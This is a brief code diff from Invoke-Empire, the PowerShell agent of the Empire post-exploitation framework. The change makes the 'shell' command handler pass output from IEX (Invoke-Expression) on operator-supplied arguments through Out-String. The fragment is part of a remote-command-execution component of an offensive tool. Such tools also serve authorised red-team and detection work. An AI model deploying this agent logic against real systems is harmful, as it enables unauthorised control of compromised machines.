@@ -274,7 +274,7 @@ function Invoke-Empire {
         if ($cmd.ToLower() -eq 'shell') {
             # if we have a straight 'shell' command, skip the aliases
             if ($cmdargs.length -eq '') { $output = 'no shell command supplied' }
-            else { $output = IEX "$cmdargs" }
+            else { $output = IEX "$cmdargs" | out-string}
             $output += "`n`r..Command execution completed."
         }
         else {
